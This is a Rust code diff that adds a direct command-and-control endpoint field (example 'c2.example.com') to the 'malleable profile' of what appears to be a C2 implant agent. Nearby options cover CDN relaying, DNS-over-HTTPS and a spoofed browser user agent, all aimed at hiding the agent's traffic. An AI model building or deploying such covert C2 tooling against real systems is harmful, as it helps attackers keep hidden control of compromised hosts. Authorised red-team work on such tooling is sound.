@@ -73,6 +73,12 @@ pub struct MalleableProfile {
     pub cdn_relay: bool,
     #[serde(default)]
     pub dns_over_https: bool,
+    /// Direct C2 endpoint used when `cdn_relay` is false.
+    /// Must be set to a real HTTPS URL (e.g., "https://c2.example.com") for
+    /// non-CDN deployments.  Defaults to empty string; the agent will error
+    /// at startup if this is empty and cdn_relay is false.
+    #[serde(default)]
+    pub direct_c2_endpoint: String,
 }
 
 fn default_user_agent() -> String { "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string() }
@@ -87,6 +93,7 @@ impl Default for MalleableProfile {
             host_header: default_host_header(),
             cdn_relay: false,
             dns_over_https: false,
+            direct_c2_endpoint: String::new(),
         }
     }
 }
